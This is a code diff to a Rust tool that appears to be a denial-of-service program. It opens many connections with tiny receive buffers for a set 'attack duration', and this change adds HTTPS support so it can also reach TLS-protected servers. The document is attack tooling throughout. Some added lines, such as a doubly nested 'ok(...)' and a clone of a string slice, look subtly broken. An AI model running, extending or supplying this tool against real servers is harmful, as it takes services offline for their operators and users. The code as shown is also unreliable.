@@ -14,7 +14,7 @@ extern crate openssl;
 extern crate tokio_openssl;
 
 use request::{create_request_str, create_default_request};
-use tokio_openssl::{SslConnectorExt};
+use tokio_openssl::{SslConnectorExt, SslStream};
 use openssl::ssl::{SslConnectorBuilder, SslConnector, SslMethod};
 use futures::future::{loop_fn, Future, Loop, ok};
 use futures::stream::Stream;
@@ -29,7 +29,7 @@ use std::sync::{
 };
 use std::time::{Duration, Instant};
 use structopt::StructOpt;
-use tokio::io;
+use tokio::io::{self, AsyncRead, AsyncWrite};
 use tokio::net::TcpStream;
 use tokio::timer::{Delay, Deadline, Interval};
 use trust_dns_resolver::Resolver;
@@ -68,6 +68,15 @@ struct Options {
     /// Duration of the attack in seconds
     #[structopt(short = "d", long = "attack-duration", default_value = "300", parse(from_str = "parse_duration"))]
     attack_duration: Duration,
+}
+
+// Workaround for trait objects with multiple traits
+trait AsyncStream: AsyncRead + AsyncWrite {}
+
+impl AsyncStream for SslStream<TcpStream> {
+}
+
+impl AsyncStream for TcpStream {
 }
 
 fn parse_duration(src: &str) -> Duration {
@@ -151,7 +160,9 @@ fn launch_attacks(
                         ));
    } else {
                 spawn(launch_attack_over_http(
+                        &host,
                         &sock_addr,
+                        &scheme,
                         &request,
                         &options,
                         open_connections.clone(),
@@ -172,8 +183,11 @@ fn print_stats(secs_since_start: u64, open_connections: &Arc<AtomicUsize>) {
     println!("Time: {}s\nOpen connections: {}\n\n", secs_since_start, open_connections.load(Ordering::SeqCst));
 }
 
+
 fn launch_attack_over_http(
+    host: &str,
     socket_addr: &SocketAddr,
+    scheme: &Scheme,
     request: &str,
     options: &Options,
     open_connections: Arc<AtomicUsize>,
@@ -183,9 +197,11 @@ fn launch_attack_over_http(
     let read_len = options.read_len;
     let recv_buffer_size = rng.gen_range(options.min_recv_buffer_size, options.max_recv_buffer_size);
     let request = request.to_string();
+    let host = host.clone();
 
     open_connections.fetch_add(1, Ordering::SeqCst);
     let err_open_conns = open_connections.clone();
+    let err_open_conns_2 = open_connections.clone();
 
     TcpStream::connect(&socket_addr)
         .map_err(move |e| {
@@ -197,6 +213,23 @@ fn launch_attack_over_http(
             .set_recv_buffer_size(recv_buffer_size)
             .unwrap();
 
+        if *scheme == Scheme::HTTPS {
+            let builder = SslConnector::builder(SslMethod::tls()).unwrap();
+
+            Box::new(SslConnectorExt::connect_async(&SslConnectorBuilder::build(builder), &host, tcp_stream)
+                .map_err(move |e| {
+                    err_open_conns_2.fetch_sub(1, Ordering::SeqCst);
+                    println!("{:?}", e);
+                }).and_then(move |tcp_stream| {
+                    ok(Box::new(tcp_stream) as Box<AsyncStream>)
+                })) as Box<Future<Item = Box<AsyncStream>, Error = ()>>
+        } else {
+            Box::new(ok(ok(Box::new(tcp_stream)))) as Box<Future<Item=Box<AsyncStream>, Error = ()>>
+        }
+                        
+
+
+    }).and_then(move |tcp_stream| {
         io::write_all(tcp_stream, request)
             .map_err(|e| println!("{:?}", e))
 
